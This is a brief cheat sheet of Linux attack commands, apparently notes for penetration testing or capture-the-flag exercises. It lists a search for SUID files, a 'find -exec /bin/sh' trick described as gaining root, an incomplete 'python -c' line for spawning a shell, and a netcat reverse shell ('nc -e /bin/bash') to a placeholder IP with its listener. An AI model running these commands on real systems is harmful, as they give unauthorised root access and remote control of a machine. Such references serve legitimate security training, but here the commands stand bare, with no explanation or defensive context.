`find / -perm -u=s -type f 2>/dev/null` 
`find . -exec /bin/sh \; -quit` - Gain root privileges in the shell
`python -c  ` - Gain a shell
`nc -e /bin/bash <ip> <port>` & `nc -lvnp <port>` - To connect and get a shell